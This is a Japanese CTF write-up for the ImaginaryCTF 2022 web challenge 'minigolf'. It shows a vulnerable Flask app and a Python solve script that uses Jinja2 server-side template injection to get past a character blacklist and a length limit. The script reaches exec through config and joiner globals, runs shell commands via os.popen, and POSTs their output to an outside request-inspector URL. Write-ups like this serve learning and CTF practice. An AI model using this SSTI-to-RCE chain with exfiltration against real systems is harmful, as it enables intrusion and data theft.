---
layout: chall
ctf_name: imaginaryctf_2022
problem_name: minigolf
genre: web
solved_date: 2022-07-17
during_ctf: true
tag: [flask,ssti]
fav: false
difficulty: easy
---

### 概要

SSTI ができる flask のアプリケーションが与えられる。なお、`{{`, `}}`, `_`, `[`, `]` が縛られ、ペイロードに 69 文字の文字数制限がかかっている。また、ペイロードは挿入前に HTML エンコードされる。なので、`"` や `'` といった文字も実質的に縛られている。

<details><summary>コード</summary>

```py
from flask import Flask, render_template_string, request, Response
import html

app = Flask(__name__)

blacklist = ["{{", "}}", "[", "]", "_"]

@app.route('/', methods=['GET'])
def home():
  print(request.args)
  if "txt" in request.args.keys():
    txt = html.escape(request.args["txt"])
    if any([n in txt for n in blacklist]):
      return "Not allowed."
    if len(txt) <= 69:
      return render_template_string(txt)
    else:
      return "Too long."
  return Response(open(__file__).read(), mimetype='text/plain')

app.run('0.0.0.0', 1337)
```

</details>


### 解法

[minigolf](../minigolf) と方針はほぼ同じ。今回は `{{` および `}}` を用いることができないため、外部に HTTP リクエストを送信することでデータを取得することにする。

<details><summary>スクリプト</summary>

```py
import html
import requests

def send(query, raw=False, **kwargs):
  payload = query if raw else '{%if ' + query + '%}{%endif%}'
  print(f'[+] {len(html.escape(payload))=}, {payload=}')
  assert len(html.escape(payload)) <= 69
  req = requests.get(
    "http://minigolf.chal.imaginaryctf.org",
    {
      "txt": payload,
      **kwargs
    }
  )
  res = req.text
  print(f'[+] {html.unescape(res)=}\n\n')
  if not raw and "Error" in res:
    assert False

# config[dest] = src.attr
def sub_attr(dest, src, attr):
  send("config.F(config.V,request.args.v)", v=attr)
  send(f"config.F(config.{dest.upper()},{src}|attr(config.v))")
# config[dest] = src[item]
def sub_item(dest, src, item):
  send("config.F(config.V,request.args.v)", v=item)
  send(f"config.F(config.{dest.upper()},{src}.get(config.v))")


# s
send("config.setdefault(request.args.X,request.args.s)", X='S', s='__setitem__')
# f
send("config.setdefault(request.args.X,request.args.ff)", X='FF', ff="F")
send("config.setdefault(config.FF,config|attr(config.S))", X='F')
# v
send("config.setdefault(request.args.X,request.args.v)", X='V', v='v')
# w
send("config.setdefault(request.args.X,request.args.w)", X='W', w='w')

sub_attr('w', 'joiner', '__init__')
sub_attr('w', 'config.w', '__globals__')

sub_item('w', 'config.w', '__builtins__')
sub_item('w', 'config.w', 'exec')

while True:
  send("config.w(request.args.q)", q=f"""
r=__import__('urllib').request
r.urlopen(r.Request('https://requestinspector.com/inspect/01g85s4t9q77sty57kf0fyhksy', data=__import__('os').popen('{input('> ')}').read().encode(), method='POST'))
""")
```

</details>

